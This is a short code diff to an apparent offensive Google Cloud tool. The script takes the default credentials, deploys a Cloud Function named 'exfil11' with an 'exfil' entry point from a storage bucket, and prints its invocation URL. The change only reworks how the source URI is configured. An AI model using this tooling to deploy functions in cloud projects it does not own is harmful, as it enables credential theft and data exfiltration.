@@ -198,11 +198,12 @@ import time
 
 credentials, project_id = google.auth.default()
 
+#------change this--------
 location = "us-east1"
 function_name = "exfil11"
-bucket_name = "anirb"
-source_zip = "function.zip"
+gsutil_uri = "gs://anirb/function.zip"
 function_entry_point = "exfil"
+#-------------------------
 
 client = CloudFunctionsServiceClient(credentials=credentials)
 
@@ -210,7 +211,7 @@ url = "https://{}-{}.cloudfunctions.net/{}".format(location, project_id, functio
 
 function = CloudFunction(
     name="projects/{}/locations/{}/functions/{}".format(project_id, location, function_name),
-    source_archive_url="gs://{}/{}".format(bucket_name, source_zip),
+    source_archive_url="{}".format(gsutil_uri),
     entry_point=function_entry_point,
     runtime="python38",
     https_trigger={},
@@ -226,6 +227,7 @@ try:
     print("[+] Takes 1-2 minutes to create")
 
 except Exception as e:
+
     if "cloudfunctions.operations.get" in str(e):
         print("[+] Permission cloudfunctions.operations.get denied (Not an Issue)")
         print(f"[+] Function Invocation URL: {url}")
